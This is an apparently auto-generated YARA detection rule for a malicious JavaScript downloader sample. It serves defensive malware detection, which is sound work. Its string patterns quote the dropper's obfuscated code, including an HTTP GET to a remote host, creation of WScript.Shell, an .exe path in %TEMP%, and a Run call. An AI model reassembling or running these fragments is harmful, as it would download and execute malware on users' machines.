rule sig_20160412_5e8e4bfe9fc1ebdb2e4950676b13bb14 {
  meta:
    description = "datamaliciousorder - file 20160412_5e8e4bfe9fc1ebdb2e4950676b13bb14.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "2a3bf6bf4f59602213849f7444a502cf064bd14fcc90dfabb2736a47deaa6640"

  strings:
    $s1  = "function TpfMr(QcZgl, VgOgk){VrdQf = VrdQf * 1; return QcZgl - VgOgk;};" fullword ascii
    $s2  = "var FwBv = function VnwBla() {return WScript[UffKoj](\"WScript\"+\".Shell\");}(), HwHte = 11;" fullword ascii
    $s3  = "ZzeEe[DjPso](\"G\" + \"ET\", \"http://prawoiznaki.pl/k3usa\", false);" fullword ascii
    $s4  = "if (ZzeEe[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "var LaLv = PeLt[\"getUTCMilliseconds\"]();" fullword ascii
    $s6  = "var HyRd = PeLt[\"getUTCMilliseconds\"]();" fullword ascii
    $s7  = "var QksOr = PeLt[\"getUTCMilliseconds\"]();" fullword ascii
    $s8  = "function MaXwe() {return FwBv[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"CHzRzG9U9vJD.ex\" + \"e\";};" fullword ascii
    $s9  = "function OibHm(){return JgqKuj + \"\";};" fullword ascii
    $s10 = "function NtDm() {return ((MeOyr == true) && (MeOyr == WtoDaq)) ? 1 : VrdQf;};" fullword ascii
    $s11 = "function LzQet(IcXat){FwBv[\"R\"+\"un\"](IcXat, VrdQf, VrdQf);};" fullword ascii
    $s12 = "MeOyr = true; " fullword ascii
    $s13 = "var WtoDaq = false;" fullword ascii
    $s14 = "var PeLt = new this[\"Date\"]();" fullword ascii
    $s15 = "function WlBze()" fullword ascii
    $s16 = "function QfBp(NbYf) {var JkrWpx = (1, 2, 3, 4, 5, NbYf); return JkrWpx;};" fullword ascii
    $s17 = "function EmcTi(){return UffKoj;};" fullword ascii
    $s18 = "return TpfMr(ZbuIfw, OcuUut);" fullword ascii
    $s19 = "WtoDaq = true; " fullword ascii
    $s20 = "function ExAov(){return 23;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}